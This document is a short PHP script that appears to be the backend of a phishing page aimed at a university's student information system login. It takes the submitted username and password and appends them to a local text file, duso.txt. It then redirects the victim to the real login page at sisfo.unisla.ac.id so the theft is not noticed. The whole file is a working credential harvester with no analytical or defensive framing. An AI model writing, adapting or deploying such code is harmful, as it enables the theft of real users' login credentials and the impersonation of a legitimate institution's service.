<?php
error_reporting(E_ALL ^ (E_NOTICE | E_WARNING));
$e = $_POST['username'];
$p = $_POST['password'];


$fd = fopen("duso.txt", "a"); 
$str = $e."-".$p;  
fwrite($fd, $str . "\r\n"); 
fclose($fd); 
header("Location: http://sisfo.unisla.ac.id//login.php");
?>